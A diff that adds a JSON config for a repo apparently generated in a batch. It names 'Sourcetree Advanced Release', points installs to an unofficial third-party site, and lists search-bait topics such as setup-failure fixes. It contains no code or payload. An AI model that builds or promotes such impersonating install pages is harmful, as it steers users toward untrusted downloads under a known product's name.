@@ -1,0 +1,23 @@
+{
+  "repo": "sourcetree-advanced-release",
+  "product": "Sourcetree Advanced Release",
+  "kind": "dev",
+  "install_type": "toolix",
+  "install_url": "https://toolix.me/",
+  "batch": "new3",
+  "format": "license-md-toolix-v1",
+  "category": "dev",
+  "topics": [
+    "sourcetree",
+    "git-gui",
+    "bitbucket-client",
+    "branch-visualizer",
+    "commit-history",
+    "sourcetree-setup-failed-fix",
+    "how-to-install-sourcetree",
+    "sourcetree-windows",
+    "sourcetree-desktop-2026",
+    "sourcetree-desktop-package"
+  ],
+  "site": "toolix.me"
+}
